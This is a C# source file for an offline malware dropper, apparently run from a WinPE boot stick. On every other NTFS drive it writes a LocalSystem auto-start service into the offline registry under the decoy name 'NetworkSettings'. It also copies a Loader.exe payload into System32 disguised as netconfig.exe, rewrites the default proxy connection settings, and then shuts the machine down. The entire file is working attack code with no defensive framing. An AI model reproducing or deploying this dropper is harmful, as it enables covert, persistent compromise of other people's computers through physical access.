using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using OffregLib;
using log4net.Config;
using log4net;
using System.Management;

namespace OfflineDropper
{
    class Program
    {
        static string rootVolume = string.Empty;
        static readonly ILog log = LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);
        static ILog logger = LogManager.GetLogger(typeof(Program));
        static void Main(string[] args)
        {
            try
            {

                BasicConfigurator.Configure();
                logger.Info("Starting...");
                DriveInfo[] drives = DriveInfo.GetDrives();
                logger.Info("Searching WINPE...");

                foreach (DriveInfo drive in drives)
                {
                    if (drive.IsReady && drive.VolumeLabel == "WINPE")
                    {
                        rootVolume = drive.Name;
                        break;
                    }
                }
                
                logger.Info("WINPE found... " + rootVolume);

                if(rootVolume == string.Empty){
                    Console.WriteLine("No pendrive with the label WINPE conected");
                    logger.Error("No pendrive with the label WINPE conected");
                    return;
                }

                logger.Info("Configuring drives...");
                foreach (DriveInfo drive in drives)
                {
                    try
                    {
                        if (drive.IsReady && drive.DriveFormat == "NTFS" && drive.Name != rootVolume)
                        {
                            logger.Info("Configuring drive " + drive);
                            InstallService(drive.Name);
                            InstallProxy(drive.Name);
                            CopyLoader(drive.Name);
                        }
                    }
                    catch (Exception ex)
                    {
                        logger.Error(ex.Message);
                        logger.Error(ex.InnerException);
                        continue;
                    }
                }
               Shutdown();
            }
            catch (Exception ex)
            {
                logger.Error(ex.InnerException);
                logger.Error(ex.Message);
            }
        }

        static void InstallService(string volume) 
        {
            string systemPath = string.Empty;

            #if DEBUG
                systemPath = "c:\\SYSTEM";
            #else
                systemPath = volume + "Windows\\System32\\config\\SYSTEM";
            #endif

            using (OffregHive hive = OffregHive.Open(systemPath))
            {
                logger.Info("Installing service on volume " + volume);

                using (OffregKey subKey = hive.Root.CreateSubKey("ControlSet001\\Services\\NetworkSettings"))
                {
                    subKey.SetValue("DelayedAutoStart", 0x00000000);
                    subKey.SetValue("Description", "Network connections manager");
                    subKey.SetValue("DisplayName", "NetworkSettings");
                    subKey.SetValue("ErrorControl", 0x00000001);
                    subKey.SetValue("ImagePath", "c:\\Windows\\System32\\netconfig.exe start=auto DisplayName=NetworkSettings\r");
                    subKey.SetValue("ObjectName", "LocalSystem");
                    subKey.SetValue("Start", 0x00000002);
                    subKey.SetValue("Type", 0x00000010);
                }

                if (File.Exists(systemPath))
                    File.Delete(systemPath);

                hive.SaveHive(systemPath, 5, 1);
                logger.Info("Service on volume " + volume + " installed with success");
            }
        }

        static void InstallProxy(string volume) 
        {
            string userPath = string.Empty;
            string systemPath = string.Empty;

            #if DEBUG
                    userPath = "c:\\NTUSER.DAT";
                    systemPath = "c:\\DEFAULT";
            #else
                    userPath = volume + "Users\\";
                    systemPath = volume + "Windows\\System32\\config\\DEFAULT";
                    DirectoryInfo userDirectory = new DirectoryInfo(userPath);
                    DirectoryInfo[] directories = userDirectory.GetDirectories();
                    var userProfileFolder = directories.OrderByDescending(f => f.LastWriteTime)
                                                       .Where(x => x.Name != "All Users" 
                                                              && x.Name != "Default" 
                                                              && x.Name != "Default User"
                                                              && x.Name != "Public").FirstOrDefault();
                    
                    userPath = userPath + userProfileFolder + "\\NTUSER.DAT";
                    logger.Info("Accessing to user profile " + userPath);
            #endif

            byte[] defaultConnectionSettings;
            byte[] savedLegacySettings;

            using (OffregHive hive = OffregHive.Open(userPath))
            {
                logger.Info("Installing proxy on volume " + volume);

                using (OffregKey key = hive.Root.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"))
                {
                    defaultConnectionSettings = key.GetValue("DefaultConnectionSettings") as byte[];
                    savedLegacySettings = key.GetValue("SavedLegacySettings") as byte[];
                }
            }


            using (OffregHive hive = OffregHive.Open(systemPath))
            {
                using (OffregKey key = hive.Root.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"))
                {
                    key.SetValue("DefaultConnectionSettings", defaultConnectionSettings);
                    key.SetValue("SavedLegacySettings", savedLegacySettings);
                }

                if (File.Exists(systemPath))
                    File.Delete(systemPath);

                hive.SaveHive(systemPath, 5, 1);
            }
            logger.Info("Proxy installed with success on volume " + volume);
        }

        static void CopyLoader(string volume) 
        {
            try
            {
                string installLocation = string.Empty;
                string sourceLocation = string.Empty;

                #if DEBUG
                installLocation = "c:\\Loader.exe";
                #else
                    installLocation = volume + "Windows\\System32\\netconfig.exe";
                #endif

                if (File.Exists(installLocation))
                    File.Delete(installLocation);

                logger.Info("Copying loader to volume " + volume);

                sourceLocation = rootVolume + "Loader.exe";

                logger.Info("Copying " + sourceLocation + " to " + installLocation);

                File.Copy(sourceLocation, installLocation);
                logger.Info("Loader installed with success on volume " + volume);
            }
            catch (Exception ex)
            {
                logger.Error(ex.InnerException);
                logger.Error(ex.Message);
            }
        }

        static void Shutdown()
        {
            ManagementBaseObject mboShutdown = null;
            ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");
            mcWin32.Get();

            // You can't shutdown without security privileges
            mcWin32.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject mboShutdownParams = mcWin32.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            mboShutdownParams["Flags"] = "1";
            mboShutdownParams["Reserved"] = "0";
            foreach (ManagementObject manObj in mcWin32.GetInstances())
            {
                mboShutdown = manObj.InvokeMethod("Win32Shutdown", mboShutdownParams, null);
            }
        }
    }
}
